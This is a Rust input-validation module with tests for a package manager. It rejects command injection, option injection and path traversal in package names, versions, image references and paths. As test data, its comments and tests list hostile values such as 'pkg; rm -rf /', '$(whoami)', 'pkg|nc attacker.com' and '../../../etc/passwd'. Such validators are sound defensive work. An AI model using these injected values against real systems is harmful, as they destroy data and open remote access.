//! Input validation for security-critical operations
//!
//! Prevents command injection, path traversal, and other input-based attacks.

#[cfg(unix)]
use anyhow::Context as _;
use thiserror::Error;

const MAX_PACKAGE_NAME_LENGTH: usize = 255;
const MAX_VERSION_LENGTH: usize = 128;
const MAX_RELATIVE_PATH_LENGTH: usize = 4096;

/// Domain failures from package-name, version, and relative-path checks.
#[derive(Debug, Error, Clone, PartialEq, Eq)]
pub enum ValidationError {
    #[error("Package name cannot be empty")]
    PackageNameEmpty,
    #[error("Package name too long (max {max} characters)")]
    PackageNameTooLong { max: usize },
    #[error("Package name cannot start with '-' (option injection protection)")]
    PackageNameStartsWithDash,
    #[error("Package name cannot start with '.' (hidden file protection)")]
    PackageNameStartsWithDot,
    #[error(
        "Invalid character {character:?} in package name. Only alphanumeric, -, _, ., +, @, / allowed"
    )]
    PackageNameInvalidChar { character: char },
    #[error("Package name cannot contain '..' (path traversal protection)")]
    PackageNamePathTraversal,
    #[error("Package name cannot start with '/'")]
    PackageNameAbsolute,
    #[error("Container image reference cannot be empty")]
    ImageRefEmpty,
    #[error("Container image reference too long (max {max} characters)")]
    ImageRefTooLong { max: usize },
    #[error("Container image reference must start with an ASCII letter or digit")]
    ImageRefMustStartAlphanumeric,
    #[error("Invalid character {character:?} in container image reference")]
    ImageRefInvalidChar { character: char },
    #[error("Version cannot be empty")]
    VersionEmpty,
    #[error("Version string too long (max {max} characters)")]
    VersionTooLong { max: usize },
    #[error("Version cannot be a filesystem path component")]
    VersionPathComponent,
    #[error("Invalid character {character:?} in version string")]
    VersionInvalidChar { character: char },
    #[error("Runtime version name 'current' is reserved")]
    RuntimeVersionReserved,
    #[error("Runtime version contains characters unsafe for filesystem paths")]
    RuntimeVersionUnsafePath,
    #[error("Path cannot be empty")]
    PathEmpty,
    #[error("Path too long (max {max} bytes)")]
    PathTooLong { max: usize },
    #[error("Path contains null byte")]
    PathNullByte,
    #[error("Absolute paths not allowed")]
    PathAbsolute,
    #[error("Path traversal detected (..)")]
    PathTraversal,
    #[error("Suspicious path pattern (//)")]
    PathDoubleSlash,
}

/// Validates a package name for security
///
/// Package names must:
/// - Contain only: a-z, A-Z, 0-9, -, _, +, ., @, /
/// - Not be empty
/// - Not start with - or . (to prevent option injection)
/// - Be at most 255 bytes long (to bound parsing work)
///
/// # Security
/// This prevents shell injection via malicious package names like:
/// - `pkg; rm -rf /`
/// - `pkg$(whoami)`
/// - `pkg|nc attacker.com`
pub fn validate_package_name(name: &str) -> Result<(), ValidationError> {
    if name.is_empty() {
        return Err(ValidationError::PackageNameEmpty);
    }

    if name.len() > MAX_PACKAGE_NAME_LENGTH {
        return Err(ValidationError::PackageNameTooLong {
            max: MAX_PACKAGE_NAME_LENGTH,
        });
    }

    if name.starts_with('-') {
        return Err(ValidationError::PackageNameStartsWithDash);
    }

    if name.starts_with('.') {
        return Err(ValidationError::PackageNameStartsWithDot);
    }

    if let Some(character) = name.chars().find(|&c| !is_safe_package_char(c)) {
        return Err(ValidationError::PackageNameInvalidChar { character });
    }

    if name.contains("..") {
        return Err(ValidationError::PackageNamePathTraversal);
    }

    if name.starts_with('/') {
        return Err(ValidationError::PackageNameAbsolute);
    }

    Ok(())
}

/// Validate Debian package specs that may pin a version (`name=1.2-3`).
///
/// The package name uses the normal package-name rules. A pinned version uses
/// the same bounded, injection-safe version grammar as other package-manager
/// input, including Debian epochs and tilde ordering.
pub fn validate_debian_package_specs(specs: &[String]) -> Result<(), ValidationError> {
    for spec in specs {
        let Some((name, version)) = spec.split_once('=') else {
            validate_package_name(spec)?;
            continue;
        };
        validate_package_name(name)?;
        if version.contains('=') {
            return Err(ValidationError::VersionInvalidChar { character: '=' });
        }
        validate_version(version)?;
    }
    Ok(())
}

/// Validate multiple package names.
pub fn validate_package_names(names: &[String]) -> Result<(), ValidationError> {
    for name in names {
        validate_package_name(name)?;
    }
    Ok(())
}

/// Validate a container image reference (`[registry/]name[:tag][@digest]`).
///
/// Unlike package names, image references legitimately contain `:` (tags,
/// digests) and `_`. The character allowlist matches Docker's reference
/// grammar subset: alphanumeric plus `. _ - / : @`, must start with an
/// alphanumeric character, and rejects traversal and option injection.
pub fn validate_image_ref(image: &str) -> Result<(), ValidationError> {
    if image.is_empty() {
        return Err(ValidationError::ImageRefEmpty);
    }
    if image.len() > 256 {
        return Err(ValidationError::ImageRefTooLong { max: 256 });
    }
    let invalid = image
        .chars()
        .find(|&c| !(c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@')));
    if let Some(character) = invalid {
        return Err(ValidationError::ImageRefInvalidChar { character });
    }
    if !image
        .chars()
        .next()
        .is_some_and(|c| c.is_ascii_alphanumeric())
    {
        return Err(ValidationError::ImageRefMustStartAlphanumeric);
    }
    if image.contains("..") {
        return Err(ValidationError::ImageRefInvalidChar { character: '.' });
    }
    Ok(())
}

/// Check if a string is a valid local package file path
///
/// Local package files are allowed to bypass normal package name validation
/// because they are paths to actual .pkg.tar.* files on disk.
#[must_use]
pub fn is_local_package_file(name: &str) -> bool {
    // Must be an absolute path
    if !name.starts_with('/') {
        return false;
    }

    // Must end with a valid package extension
    let valid_extensions = [
        ".pkg.tar.zst",
        ".pkg.tar.xz",
        ".pkg.tar.gz",
        ".pkg.tar.bz2",
        ".pkg.tar",
    ];

    if !valid_extensions.iter().any(|ext| name.ends_with(ext)) {
        return false;
    }

    // Must not contain path traversal
    if name.contains("..") {
        return false;
    }

    true
}

/// Return whether `name` is a local Debian package archive path.
#[must_use]
pub fn is_local_debian_package_file(name: &str) -> bool {
    let path = std::path::Path::new(name);
    matches!(
        path.extension().and_then(std::ffi::OsStr::to_str),
        Some(extension) if extension.eq_ignore_ascii_case("deb")
            || extension.eq_ignore_ascii_case("ddeb")
    ) && !name.starts_with('-')
        && !name.contains("..")
        && !name.contains('\0')
}

/// Resolve a local package archive through an ownership and mode boundary.
///
/// The archive and its immediate directory must be owned by root or the
/// invoking user and must not be group/world writable. Symlinks are rejected
/// before canonicalization so another local account cannot swap the root-bound
/// artifact through a writable directory between validation and ALPM loading.
#[cfg(unix)]
fn validate_local_archive_file(path: &str, supported: bool) -> anyhow::Result<std::path::PathBuf> {
    use std::os::unix::fs::MetadataExt;

    anyhow::ensure!(supported, "not a supported local package archive path");
    let input = std::path::Path::new(path);
    let link_metadata = std::fs::symlink_metadata(input)
        .map_err(|error| anyhow::anyhow!("Cannot inspect local package archive {path}: {error}"))?;
    anyhow::ensure!(
        !link_metadata.file_type().is_symlink(),
        "local package archive must not be a symlink: {path}"
    );

    let canonical = std::fs::canonicalize(input)
        .map_err(|error| anyhow::anyhow!("Cannot resolve local package archive {path}: {error}"))?;
    let metadata = std::fs::metadata(&canonical)?;
    anyhow::ensure!(
        metadata.is_file(),
        "local package archive is not a regular file: {}",
        canonical.display()
    );

    let invoking_uid = crate::core::privilege::invoking_uid()?;
    let owner_allowed = |uid| uid == 0 || uid == invoking_uid;
    anyhow::ensure!(
        owner_allowed(metadata.uid()),
        "local package archive is owned by an untrusted user"
    );
    anyhow::ensure!(
        metadata.mode() & 0o022 == 0,
        "local package archive must not be group/world writable"
    );

    let parent = canonical
        .parent()
        .context("local package archive has no parent directory")?;
    let parent_metadata = std::fs::metadata(parent)?;
    anyhow::ensure!(
        owner_allowed(parent_metadata.uid()),
        "local package directory is owned by an untrusted user"
    );
    anyhow::ensure!(
        parent_metadata.mode() & 0o022 == 0,
        "local package directory must not be group/world writable"
    );
    Ok(canonical)
}

/// Resolve a local Arch package archive through an ownership and mode boundary.
#[cfg(unix)]
pub fn validate_local_package_file(path: &str) -> anyhow::Result<std::path::PathBuf> {
    validate_local_archive_file(path, is_local_package_file(path))
}

/// Resolve a local Debian package archive through an ownership and mode boundary.
#[cfg(unix)]
pub fn validate_local_debian_package_file(path: &str) -> anyhow::Result<std::path::PathBuf> {
    validate_local_archive_file(path, is_local_debian_package_file(path))
}

/// Validates a package name or local package file path
///
/// Accepts either a valid package name OR an existing local package file.
pub fn validate_package_name_or_file(name: &str) -> Result<(), ValidationError> {
    // Allow local package files
    if is_local_package_file(name) {
        return Ok(());
    }

    // Otherwise validate as package name
    validate_package_name(name)
}

/// Validate Debian package names, version-pinned specs, and local archives.
pub fn validate_debian_package_name_or_file(name: &str) -> Result<(), ValidationError> {
    if is_local_debian_package_file(name) {
        return Ok(());
    }
    validate_debian_package_specs(&[name.to_string()])
}

/// Validate a collection of Debian package names, specs, or local archives.
pub fn validate_debian_package_names_or_files(names: &[String]) -> Result<(), ValidationError> {
    for name in names {
        validate_debian_package_name_or_file(name)?;
    }
    Ok(())
}

/// Validates multiple package names or local package file paths
pub fn validate_package_names_or_files(names: &[String]) -> Result<(), ValidationError> {
    for name in names {
        validate_package_name_or_file(name)?;
    }
    Ok(())
}

/// Checks if a character is safe for package names
#[inline]
fn is_safe_package_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '+' | '.' | '@' | '/')
}

fn validate_version_shape(version: &str) -> Result<(), ValidationError> {
    if version.is_empty() {
        return Err(ValidationError::VersionEmpty);
    }

    if version.len() > MAX_VERSION_LENGTH {
        return Err(ValidationError::VersionTooLong {
            max: MAX_VERSION_LENGTH,
        });
    }

    if matches!(version, "." | "..") {
        return Err(ValidationError::VersionPathComponent);
    }

    Ok(())
}

/// Validates a version string
///
/// Version strings should follow semver or similar format.
/// This prevents injection via version fields.
pub fn validate_version(version: &str) -> Result<(), ValidationError> {
    validate_version_shape(version)?;

    // Allow: digits, dots, hyphens, plus, colons (for epochs), and letters
    for character in version.chars() {
        if !character.is_ascii_alphanumeric() && !matches!(character, '.' | '-' | '+' | ':' | '~') {
            return Err(ValidationError::VersionInvalidChar { character });
        }
    }

    Ok(())
}

/// Validate a runtime version before using it as a filesystem path component.
///
/// Runtime versions are stricter than package versions: package-manager epoch
/// and tilde syntax are not valid runtime directory names, and `current` is
/// reserved for the active-version symlink. Underscores remain valid because
/// Rust target triples use architecture names such as `x86_64`.
pub fn validate_runtime_version(version: &str) -> Result<(), ValidationError> {
    validate_version_shape(version)?;

    if version.eq_ignore_ascii_case("current") {
        return Err(ValidationError::RuntimeVersionReserved);
    }

    if version.contains(':') || version.contains('~') {
        return Err(ValidationError::RuntimeVersionUnsafePath);
    }

    for character in version.chars() {
        if !character.is_ascii_alphanumeric() && !matches!(character, '.' | '-' | '+' | '_') {
            return Err(ValidationError::VersionInvalidChar { character });
        }
    }

    Ok(())
}

/// Validates a path for security (prevents path traversal)
///
/// Ensures paths:
/// - Don't contain ../ (parent directory)
/// - Don't start with / (absolute paths)
/// - Don't contain null bytes
pub fn validate_relative_path(path: &str) -> Result<(), ValidationError> {
    if path.is_empty() {
        return Err(ValidationError::PathEmpty);
    }

    if path.len() > MAX_RELATIVE_PATH_LENGTH {
        return Err(ValidationError::PathTooLong {
            max: MAX_RELATIVE_PATH_LENGTH,
        });
    }

    if path.contains('\0') {
        return Err(ValidationError::PathNullByte);
    }

    if path.starts_with('/') {
        return Err(ValidationError::PathAbsolute);
    }

    if path.contains("..") {
        return Err(ValidationError::PathTraversal);
    }

    if path.contains("//") {
        return Err(ValidationError::PathDoubleSlash);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn validation_errors_escape_rejected_control_characters() {
        for error in [
            validate_package_name("pkg\x1b]0;spoofed\x07").expect_err("escape is invalid"),
            validate_image_ref("image\nspoofed").expect_err("newline is invalid"),
            validate_version("1.0\rspoofed").expect_err("carriage return is invalid"),
        ] {
            let message = error.to_string();
            assert!(!message.chars().any(char::is_control), "{message:?}");
        }
    }

    #[test]
    fn test_valid_package_names() {
        assert!(validate_package_name("python").is_ok());
        assert!(validate_package_name("python3").is_ok());
        assert!(validate_package_name("lib-foo").is_ok());
        assert!(validate_package_name("lib_bar").is_ok());
        assert!(validate_package_name("foo+bar").is_ok());
        assert!(validate_package_name("foo.bar").is_ok());
        assert!(validate_package_name("@angular/cli").is_ok());
    }

    #[test]
    fn test_invalid_package_names() {
        assert!(matches!(
            validate_package_name("pkg; rm -rf /"),
            Err(ValidationError::PackageNameInvalidChar { character: ';' })
        ));
        assert!(matches!(
            validate_package_name("pkg$(whoami)"),
            Err(ValidationError::PackageNameInvalidChar { character: '$' })
        ));
        assert!(validate_package_name("pkg`id`").is_err());
        assert!(validate_package_name("pkg|nc evil.com").is_err());
        assert!(validate_package_name("pkg&& curl evil").is_err());
        assert!(validate_package_name("pkg\n/bin/bash").is_err());

        assert!(matches!(
            validate_package_name("../../../etc/passwd"),
            Err(ValidationError::PackageNameStartsWithDot)
        ));
        assert!(matches!(
            validate_package_name("foo/../bar"),
            Err(ValidationError::PackageNamePathTraversal)
        ));

        assert!(matches!(
            validate_package_name("-rf"),
            Err(ValidationError::PackageNameStartsWithDash)
        ));
        assert!(validate_package_name("--force").is_err());

        assert!(matches!(
            validate_package_name(".bashrc"),
            Err(ValidationError::PackageNameStartsWithDot)
        ));

        assert!(matches!(
            validate_package_name("/etc/passwd"),
            Err(ValidationError::PackageNameAbsolute)
        ));

        assert!(matches!(
            validate_package_name(""),
            Err(ValidationError::PackageNameEmpty)
        ));
        assert!(matches!(
            validate_package_name(&"a".repeat(256)),
            Err(ValidationError::PackageNameTooLong {
                max: MAX_PACKAGE_NAME_LENGTH
            })
        ));
    }

    #[test]
    fn debian_package_specs_validate_names_and_versions() {
        assert!(
            validate_debian_package_specs(&[
                "libc6=2:2.36-9~deb12u1".to_string(),
                "ca-certificates".to_string(),
            ])
            .is_ok()
        );
        assert!(matches!(
            validate_debian_package_specs(&["curl=".to_string()]),
            Err(ValidationError::VersionEmpty)
        ));
        assert!(matches!(
            validate_debian_package_specs(&["curl=1.2\n3".to_string()]),
            Err(ValidationError::VersionInvalidChar { character: '\n' })
        ));
        assert!(matches!(
            validate_debian_package_specs(&["curl=1=2".to_string()]),
            Err(ValidationError::VersionInvalidChar { character: '=' })
        ));
    }

    #[test]
    fn test_valid_versions() {
        assert!(validate_version(&"1".repeat(128)).is_ok());
        assert!(validate_version("1.0.0").is_ok());
        assert!(validate_version("2.3.4-rc1").is_ok());
        assert!(validate_version("1:2.3.4").is_ok()); // epoch
        assert!(validate_version("1.0.0+build123").is_ok());
        assert!(validate_version("1.0~rc1").is_ok());
    }

    #[test]
    fn test_invalid_versions() {
        assert!(matches!(
            validate_version(""),
            Err(ValidationError::VersionEmpty)
        ));
        assert!(matches!(
            validate_version(&"1".repeat(129)),
            Err(ValidationError::VersionTooLong {
                max: MAX_VERSION_LENGTH
            })
        ));
        assert!(matches!(
            validate_version("1.0; rm -rf /"),
            Err(ValidationError::VersionInvalidChar { character: ';' })
        ));
        assert!(validate_version("1.0$(whoami)").is_err());
        assert!(matches!(
            validate_version("."),
            Err(ValidationError::VersionPathComponent)
        ));
        assert!(matches!(
            validate_version(".."),
            Err(ValidationError::VersionPathComponent)
        ));
    }

    #[test]
    fn runtime_versions_are_safe_path_components() {
        for version in [
            "1.0.0",
            "v22.1.0",
            "1.82.0-beta.5",
            "nightly-2026-08-15",
            "stable-x86_64-unknown-linux-gnu",
        ] {
            assert!(validate_runtime_version(version).is_ok(), "{version}");
        }

        assert!(matches!(
            validate_runtime_version("current"),
            Err(ValidationError::RuntimeVersionReserved)
        ));
        assert!(matches!(
            validate_runtime_version("1:2.0"),
            Err(ValidationError::RuntimeVersionUnsafePath)
        ));
        for version in [".", "..", "CURRENT", "1.0~rc1", "../1.0"] {
            assert!(validate_runtime_version(version).is_err(), "{version}");
        }
    }

    #[test]
    fn test_valid_relative_paths() {
        assert!(validate_relative_path("foo/bar").is_ok());
        assert!(validate_relative_path("a/b/c.txt").is_ok());
    }

    #[test]
    fn test_invalid_relative_paths() {
        assert!(matches!(
            validate_relative_path(""),
            Err(ValidationError::PathEmpty)
        ));
        assert!(matches!(
            validate_relative_path("/etc/passwd"),
            Err(ValidationError::PathAbsolute)
        ));
        assert!(matches!(
            validate_relative_path("../../../etc/passwd"),
            Err(ValidationError::PathTraversal)
        ));
        assert!(matches!(
            validate_relative_path("foo/../bar"),
            Err(ValidationError::PathTraversal)
        ));
        assert!(matches!(
            validate_relative_path("foo//bar"),
            Err(ValidationError::PathDoubleSlash)
        ));
        assert!(matches!(
            validate_relative_path("foo\0bar"),
            Err(ValidationError::PathNullByte)
        ));
    }

    #[test]
    fn relative_path_length_is_bounded_in_bytes() {
        let max_ascii = "a".repeat(MAX_RELATIVE_PATH_LENGTH);
        assert!(validate_relative_path(&max_ascii).is_ok());

        let too_long_ascii = "a".repeat(MAX_RELATIVE_PATH_LENGTH + 1);
        let error = validate_relative_path(&too_long_ascii)
            .expect_err("path above the byte limit must be rejected");
        assert!(
            matches!(
                error,
                ValidationError::PathTooLong {
                    max: MAX_RELATIVE_PATH_LENGTH
                }
            ),
            "got: {error}"
        );

        let max_multibyte = "é".repeat(MAX_RELATIVE_PATH_LENGTH / "é".len());
        assert_eq!(max_multibyte.len(), MAX_RELATIVE_PATH_LENGTH);
        assert!(validate_relative_path(&max_multibyte).is_ok());

        let too_long_multibyte = format!("{max_multibyte}é");
        assert!(validate_relative_path(&too_long_multibyte).is_err());
    }

    #[test]
    fn test_is_local_package_file() {
        // Valid local package files
        assert!(is_local_package_file(
            "/home/user/package-1.0-1-x86_64.pkg.tar.zst"
        ));
        assert!(is_local_package_file(
            "/home/user/package-1.0-1-x86_64.pkg.tar.xz"
        ));
        assert!(is_local_package_file(
            "/home/user/package-1.0-1-x86_64.pkg.tar.gz"
        ));
        assert!(is_local_package_file(
            "/home/user/package-1.0-1-x86_64.pkg.tar.bz2"
        ));
        assert!(is_local_package_file(
            "/tmp/brave-bin-1:1.73.104-1-x86_64.pkg.tar.zst"
        ));
        assert!(is_local_package_file(
            "/var/cache/omg/aur/package/package.pkg.tar.zst"
        ));

        // Invalid - not absolute paths
        assert!(!is_local_package_file("package-1.0-1-x86_64.pkg.tar.zst"));
        assert!(!is_local_package_file("./package-1.0-1-x86_64.pkg.tar.zst"));
        assert!(!is_local_package_file(
            "../package-1.0-1-x86_64.pkg.tar.zst"
        ));

        // Invalid - wrong extension
        assert!(!is_local_package_file(
            "/home/user/package-1.0-1-x86_64.tar.gz"
        ));
        assert!(!is_local_package_file(
            "/home/user/package-1.0-1-x86_64.deb"
        ));
        assert!(!is_local_package_file("/home/user/package.txt"));

        // Invalid - path traversal
        assert!(!is_local_package_file("/home/../etc/package.pkg.tar.zst"));
        assert!(!is_local_package_file(
            "/home/user/../root/package.pkg.tar.zst"
        ));

        // Edge cases - not package names
        assert!(!is_local_package_file("brave"));
        assert!(!is_local_package_file("brave-bin"));
        assert!(!is_local_package_file("python3"));
    }

    #[test]
    fn debian_package_file_validation_accepts_supported_path_shapes() {
        assert!(is_local_debian_package_file("./package.deb"));
        assert!(is_local_debian_package_file("/tmp/package.ddeb"));
        assert!(!is_local_debian_package_file("../package.deb"));
        assert!(!is_local_debian_package_file("package.txt"));
        assert!(validate_debian_package_name_or_file("curl=8.0-1").is_ok());
    }

    #[test]
    fn test_validate_package_name_or_file() {
        // Valid package names
        assert!(validate_package_name_or_file("python").is_ok());
        assert!(validate_package_name_or_file("brave-bin").is_ok());
        assert!(validate_package_name_or_file("lib-foo").is_ok());

        // Valid local package files
        assert!(
            validate_package_name_or_file("/home/user/package-1.0-1-x86_64.pkg.tar.zst").is_ok()
        );
        assert!(
            validate_package_name_or_file("/tmp/brave-bin-1:1.73.104-1-x86_64.pkg.tar.zst").is_ok()
        );

        // Invalid - malicious package names
        assert!(validate_package_name_or_file("pkg; rm -rf /").is_err());
        assert!(validate_package_name_or_file("pkg$(whoami)").is_err());

        // Invalid - path traversal
        assert!(validate_package_name_or_file("/home/../etc/package.pkg.tar.zst").is_err());
    }

    #[test]
    fn valid_tagged_image_references_are_accepted() {
        // The documented default and common real-world references must pass.
        assert!(validate_image_ref("ubuntu:24.04").is_ok());
        assert!(validate_image_ref("ubuntu").is_ok());
        assert!(validate_image_ref("ghcr.io/owner/img:1.2").is_ok());
        assert!(validate_image_ref("my_registry/img:latest").is_ok());
        assert!(validate_image_ref("node:20-alpine").is_ok());
    }

    #[test]
    fn hostile_image_references_are_rejected() {
        assert_eq!(validate_image_ref(""), Err(ValidationError::ImageRefEmpty));
        assert_eq!(
            validate_image_ref(&"a".repeat(257)),
            Err(ValidationError::ImageRefTooLong { max: 256 })
        );
        assert!(matches!(
            validate_image_ref("evil;rm -rf /"),
            Err(ValidationError::ImageRefInvalidChar { character: ';' })
        ));
        assert_eq!(
            validate_image_ref("-flag"),
            Err(ValidationError::ImageRefMustStartAlphanumeric)
        );
        assert!(validate_image_ref("img$(whoami)").is_err());
        assert!(validate_image_ref("a b").is_err());
        assert!(validate_image_ref("../etc/passwd").is_err());
        assert!(validate_image_ref("img/../../etc").is_err());
    }
}
